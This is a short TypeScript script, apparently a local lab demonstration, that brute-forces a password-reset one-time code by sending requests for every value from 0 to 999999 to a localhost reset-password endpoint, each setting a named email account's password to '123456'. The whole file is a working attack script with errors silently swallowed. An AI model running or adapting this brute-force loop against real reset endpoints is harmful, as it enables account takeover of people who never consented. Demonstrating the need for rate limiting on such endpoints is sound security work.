import axios from "axios";

async function attackScript(otp: string) {
    let data = JSON.stringify({
        "email": "rakhshancoder@gmail.com",
        "otp": otp,
        "newPassword": "123456"
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: {
            'Content-Type': 'application/json'
        },
        data: data
    };

    try {
        await axios.request(config)
    } catch (error) {

    }
}


let p:any = [];

async function main() {
    for (let i = 0; i <= 999999; i += 100) {
        // console.log(i);
        for (let j = 0; j < 100; j++) {
            console.log(i+j);
            p.push(attackScript((i + j).toString()));
        }
        await Promise.all(p);
    }
}

main();